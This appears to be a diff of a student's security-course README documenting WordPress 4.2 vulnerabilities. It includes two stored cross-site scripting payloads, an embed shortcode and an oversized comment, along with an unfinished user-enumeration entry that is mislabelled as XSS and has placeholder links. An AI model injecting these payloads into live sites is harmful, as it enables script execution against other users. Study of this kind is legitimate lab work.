@@ -1,36 +1,43 @@
-## Unit 8 Lab Exercises: WordPress vs. Kali, Round 2
+## Unit 7 & 8 Project: WordPress vs. Kali
 
 **Homework Instructions**:
 
-There is a lot of work to be done in this module, so it is important to keep your eyes on the prize. The main goals of this module are that by the end, you can:
+Time spent: **48** hours spent in total
 
-Describe in detail how the Metasploit framework works
-Use industry-standard tools to identify known vulnerabilities from the Common Vulnerabilities and Exposures database
-During this lab, you'll be using known vulnerabilities in common software. Later in the course, we'll explore the following resource:
+> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPres
 
-Common Exposures and Vulnerabilities
-This database is a cross-industry effort by security researchers, application developers, and the rest of the software ecosystem to catalog, expose, and fix common vulnerabilities in popular software.
+### 1. (Required) Youtube Embedded Cross-Site Scripting
 
-**Challenges and Problems**: 
+- [ ] Summary: 
+- Vulnerability types: XSS
+- Tested in version: 4.2
+- Fixed in version: 4.7.3
+- [ ] GIF Walkthrough: <img src="2022-10-28-12-50-39.gif">
+- [ ] Steps to recreate: 
+- Create a post with the following text: [embed src='http://www.youtube.com/embed/sss\x3csvg onload=alert(1)\x3e'][/embed]
+- [ ] Affected source code:
+  - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
+  
+### 2. (Required) Comment Cross-Site Scripting
 
-### Milestone 0: Preparing the Playing Field
+- [ ] Summary: 
+- Vulnerability types: XSS
+- Tested in version: 4.2
+- Fixed in version: 4.7.3
+- [ ] GIF Walkthrough: <img src="Untitled design.gif">
+- [ ] Steps to recreate: 
+- Paste the following text in a comment: <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px AAAAAAAAAAAA...[64 kb]..AAA'></a> 
+- Make sure the character length is 64kb or more.
+- [ ] Affected source code:
+  - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 
-<img src="Screenshot 2022-10-27 132805.png">
- 
-### Milestone 1: Opening an Attack Surface
+### 3. (Required) User Enumeration
 
-<img src="Screenshot 2022-10-24 153511.png">
-
-### Milestone 2: Recon
-
-<img src="Screenshot 2022-10-24 153859.png">
-
-## Milestone 3: Hello, Metasploit
-
-<img src="Screenshot 2022-10-24 154116.png">
-
-<img src="Screenshot 2022-10-27 134604.png">
-
-## Milestone 5: Tag it
-
-<img src="Screenshot 2022-10-27 152254.png">
+- [ ] Summary: 
+Vulnerability types: XSS
+Tested in version: 4.2
+Fixed in version: 4.7.3 
+- [ ] GIF Walkthrough: <img src="2022-10-28-12-55-33.gif">
+- [ ] Steps to recreate: 
+- [ ] Affected source code:
+  - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
